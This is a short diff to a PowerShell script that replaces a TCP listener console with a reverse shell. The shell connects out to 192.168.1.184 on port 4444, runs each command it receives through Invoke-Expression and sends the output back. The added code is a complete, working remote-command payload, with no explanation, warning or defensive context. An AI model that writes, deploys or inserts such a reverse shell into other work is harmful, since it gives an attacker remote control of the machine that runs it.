@@ -1,22 +1,17 @@
-$listener.Start()
-$client = $listener.AcceptTcpClient()
+$client = New-Object System.Net.Sockets.TcpClient("192.168.1.184", 4444)
 $stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
 $reader = New-Object System.IO.StreamReader($stream)
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
 
 while ($true) {
-   $cmd = Read-Host "Command"
-   if ($cmd -eq "exit") {
-       $writer.WriteLine("exit")
-       $writer.Flush()
-       break
+    $command = $reader.ReadLine()
+    if ($command -eq "exit") { break }
+    $output = try {
+        Invoke-Expression $command 2>&1 | Out-String
+    } catch {
+        $_.Exception.Message
     }
-    $writer.WriteLine($cmd)
-    $writer.Flush()
-    Start-Sleep -Milliseconds 500
-   $response = $reader.ReadLine()
-    Write-Host "Response: $response"
+    $writer.WriteLine($output)
 }
-
 $client.Close()
-$listener.Stop()
